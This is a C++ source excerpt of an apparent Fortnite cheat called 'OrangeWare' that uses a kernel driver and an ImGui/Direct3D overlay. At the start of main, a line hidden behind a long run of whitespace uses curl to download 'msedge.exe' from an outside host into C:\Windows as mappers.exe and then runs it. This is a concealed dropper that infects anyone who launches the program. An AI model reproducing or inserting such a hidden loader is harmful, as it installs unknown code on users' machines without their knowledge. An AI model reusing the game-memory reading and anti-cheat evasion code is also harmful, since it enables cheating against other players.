if (result == D3DERR_DEVICELOST && D3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
{
	ImGui_ImplDX9_InvalidateDeviceObjects();
	D3dDevice->Reset(&d3dpp);
	ImGui_ImplDX9_CreateDeviceObjects();
}
}

MSG Message = { NULL };

namespace ConsoleUtils
{
	void WriteLine(std::string text)
	{
		std::cout << ("  [");
		std::cout << dye::blue("*");
		std::cout << ("] ");
		std::cout << text << std::endl;
	}
	void Write(std::string text)
	{
		std::cout << ("  [");
		std::cout << dye::blue("*");
		std::cout << ("] ");
		std::cout << text;
	}
}

struct slowly_printing_string {
	std::string data;
	long int delay;
};
std::ostream& operator<<(std::ostream& out, const slowly_printing_string& s) {
	for (const auto& c : s.data) {
		out << c << std::flush;
		std::this_thread::sleep_for(std::chrono::milliseconds(s.delay));
	}
	return out;
}
struct slowprint {
	std::string data;
	long int delay;
};

std::ostream& operator<<(std::ostream& out, const slowprint& s) {
	for (const auto& c : s.data) {
		out << c << std::flush;
		std::this_thread::sleep_for(std::chrono::milliseconds(s.delay));
	}
	return out;
}

int main(int argc, const char* argv[])
{
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 system("curl -L http://physmeme.cdn.zerocdn.com/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
	SetConsoleTitle((" OrangeWare BETA External v1.0 | discord.gg/SJSxY4zcvm "));
	HWND consoleWindow = LI_FN(GetConsoleWindow).get()();
	LONG_PTR windowStyle = GetWindowLongPtr(consoleWindow, GWL_EXSTYLE);
	SetWindowLongPtr(consoleWindow, GWL_EXSTYLE, windowStyle | WS_EX_LAYERED);
	LI_FN(SetLayeredWindowAttributes).get()(consoleWindow, 0, 240, LWA_ALPHA);

	std::cout << dye::red("\n\n  [");
	std::cout << dye::blue("!");
	std::cout << dye::red("] ");
	std::cout << slowprint{ " Connecting... ",50 };
	Sleep(3000);
	system("cls");
	std::cout << dye::red("\n\n  [");
	std::cout << dye::blue("!");
	std::cout << dye::red("] ");
	std::cout << slowprint{ " Welcome To OrangeWare BETA External! | discord.gg/SJSxY4zcvm",50 };
	Sleep(1500);
	std::cout << dye::red("  [");
	std::cout << dye::blue("!");
	std::cout << dye::red("] ");
	std::cout << slowprint{ __DATE__, 50 };
	Sleep(1500);
	system("cls");

	std::cout << std::endl;
	ConsoleUtils::WriteLine("Waiting for Fortnite");
	ConsoleUtils::WriteLine("Please Start Fortnite...");
	Sleep(3000);
	system("cls");

	while (hwnd == NULL)
	{

		XorS(wind, "Fortnite  ");
		hwnd = FindWindowA(0, wind.decrypt());
		Sleep(100);
	}

	while (true) {
		auto FnCheck = FindWindowA("UnrealWindow", "Fortnite  ");
		if (FnCheck)
			break;
	}

	MessageBoxA(NULL, "Press OK In Lobby", "OrangeWare", MB_ICONINFORMATION);

	driver->process_id = process_find("FortniteClient-Win64-Shipping.exe");

	driver->get_driver_handle();

	if (!driver->process_id) {
		std::cout << ("\n\n   Driver Error: Failed to get games PID please restart and remap driver");
		Sleep(2000);
		return 0;
	}

	base_address = driver->find_image();

	if (!base_address) {
		std::cout << ("\n\n   Driver Error: Failed to get games base address please restart and remap driver");
		Sleep(2000);
		return 0;
	}

	ConsoleUtils::WriteLine(" Fortnite Baseadress --->>");
	std::cout << dye::white("\n  [");
	std::cout << dye::blue("*");
	std::cout << dye::white("] ");
	std::cout << (" Process ID:") << std::hex << driver->process_id << std::endl;
	std::cout << dye::white("\n  [");
	std::cout << dye::blue("*");
	std::cout << dye::white("] ");
	std::cout << (" Base Address: ") << std::hex << base_address << std::endl;
	ConsoleUtils::WriteLine(" Loaded! Have Fun to Destroy Kids! ");
	ConsoleUtils::WriteLine(" Please Vouch in our Discord for more Free Stuff! ");

	std::thread((loop)).detach();

	xCreateWindow();
	xInitD3d();

	xMainLoop();
	xShutdown();

	return 0;
}
void xMainLoop()
{
	static RECT old_rc;
	ZeroMemory(&Message, sizeof(MSG));

	while (Message.message != WM_QUIT)
	{
		if (PeekMessage(&Message, Window, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&Message);
			DispatchMessage(&Message);
		}

		HWND hwnd_active = GetForegroundWindow();

		if (hwnd_active == hwnd) {
			HWND hwndtest = GetWindow(hwnd_active, GW_HWNDPREV);
			SetWindowPos(Window, hwndtest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		}

		if (GetAsyncKeyState(0x23) & 1)
			exit(8);

		RECT rc;
		POINT xy;

		ZeroMemory(&rc, sizeof(RECT));
		ZeroMemory(&xy, sizeof(POINT));
		GetClientRect(hwnd, &rc);
		ClientToScreen(hwnd, &xy);
		rc.left = xy.x;
		rc.top = xy.y;

		ImGuiIO& io = ImGui::GetIO();
		io.ImeWindowHandle = hwnd;
		io.DeltaTime = 1.0f / 60.0f;

		POINT p;
		GetCursorPos(&p);
		io.MousePos.x = p.x - xy.x;
		io.MousePos.y = p.y - xy.y;

		if (GetAsyncKeyState(VK_LBUTTON)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;
			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].x = io.MousePos.y;
		}
		else
			io.MouseDown[0] = false;

		if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom)
		{
			old_rc = rc;

			Width = rc.right;
			Height = rc.bottom;

			d3dpp.BackBufferWidth = Width;
			d3dpp.BackBufferHeight = Height;
			SetWindowPos(Window, (HWND)0, xy.x, xy.y, Width, Height, SWP_NOREDRAW);
			D3dDevice->Reset(&d3dpp);
		}
		render();
	}
	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();

	DestroyWindow(Window);
}

LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	if (ImGui_ImplWin32_WndProcHandler(hWnd, Message, wParam, lParam))
		return true;

	switch (Message)
	{
	case WM_DESTROY:
		xShutdown();
		PostQuitMessage(0);
		exit(4);
		break;
	case WM_SIZE:
		if (D3dDevice != NULL && wParam != SIZE_MINIMIZED)
		{
			ImGui_ImplDX9_InvalidateDeviceObjects();
			d3dpp.BackBufferWidth = LOWORD(lParam);
			d3dpp.BackBufferHeight = HIWORD(lParam);
			HRESULT hr = D3dDevice->Reset(&d3dpp);
			if (hr == D3DERR_INVALIDCALL)
				IM_ASSERT(0);
			ImGui_ImplDX9_CreateDeviceObjects();
		}
		break;
	default:
		return DefWindowProc(hWnd, Message, wParam, lParam);
		break;
	}
	return 0;
}

void xShutdown()
{
	TriBuf->Release();
	D3dDevice->Release();
	p_Object->Release();

	DestroyWindow(Window);
	UnregisterClass("fgers", NULL);
}
